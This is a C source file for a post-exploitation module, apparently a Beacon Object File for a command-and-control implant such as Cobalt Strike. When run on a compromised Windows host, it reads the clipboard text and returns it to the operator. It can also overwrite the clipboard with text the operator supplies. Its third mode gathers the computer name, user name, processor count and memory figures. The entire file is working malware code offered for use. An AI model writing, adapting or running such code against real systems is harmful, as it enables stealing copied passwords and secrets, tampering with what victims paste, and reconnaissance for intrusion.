#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT UINT WINAPI USER32$GetClipboardFormatNameA(UINT, LPSTR, int);
DECLSPEC_IMPORT HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT BOOL WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT BOOL WINAPI USER32$EmptyClipboard(void);
DECLSPEC_IMPORT HANDLE WINAPI USER32$SetClipboardData(UINT, HANDLE);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL);
DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetComputerNameA(LPSTR, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, PDWORD);
DECLSPEC_IMPORT void WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GlobalMemoryStatusEx(LPMEMORYSTATUSEX);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
DECLSPEC_IMPORT void WINAPI MSVCRT$memcpy(void*, const void*, size_t);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    
    if (mode == 0) {
        if (USER32$OpenClipboard(NULL)) {
            HANDLE hData = USER32$GetClipboardData(CF_TEXT);
            if (hData) {
                char *text = (char*)KERNEL32$GlobalLock(hData);
                if (text) {
                    BeaconPrintf(CALLBACK_OUTPUT, "=== Clipboard Content ===");
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
                    KERNEL32$GlobalUnlock(hData);
                }
            }
            USER32$CloseClipboard();
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open clipboard");
        }
    }
    else if (mode == 1) {
        char *text = BeaconDataExtract(&parser, NULL);
        if (text && USER32$OpenClipboard(NULL)) {
            USER32$EmptyClipboard();
            HGLOBAL hMem = KERNEL32$GlobalAlloc(GMEM_MOVEABLE, MSVCRT$strlen(text) + 1);
            if (hMem) {
                void *p = KERNEL32$GlobalLock(hMem);
                if (p) {
                    MSVCRT$memcpy(p, text, MSVCRT$strlen(text) + 1);
                    KERNEL32$GlobalUnlock(hMem);
                }
                USER32$SetClipboardData(CF_TEXT, hMem);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard set");
            }
            USER32$CloseClipboard();
        }
    }
    else if (mode == 2) {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        KERNEL32$GetComputerNameA(computerName, &size);
        
        char userName[256] = {0};
        DWORD userSize = 256;
        ADVAPI32$GetUserNameA(userName, &userSize);
        
        SYSTEM_INFO si;
        KERNEL32$GetSystemInfo(&si);
        
        MEMORYSTATUSEX mem;
        mem.dwLength = sizeof(mem);
        KERNEL32$GlobalMemoryStatusEx(&mem);
        
        BeaconPrintf(CALLBACK_OUTPUT, "=== System Information ===");
        BeaconPrintf(CALLBACK_OUTPUT, "  Computer: %s", computerName);
        BeaconPrintf(CALLBACK_OUTPUT, "  User: %s", userName);
        BeaconPrintf(CALLBACK_OUTPUT, "  Processors: %d", si.dwNumberOfProcessors);
        BeaconPrintf(CALLBACK_OUTPUT, "  Total RAM: %llu MB", mem.ullTotalPhys / 1024 / 1024);
        BeaconPrintf(CALLBACK_OUTPUT, "  Used RAM: %llu%%", mem.dwMemoryLoad);
    }
}
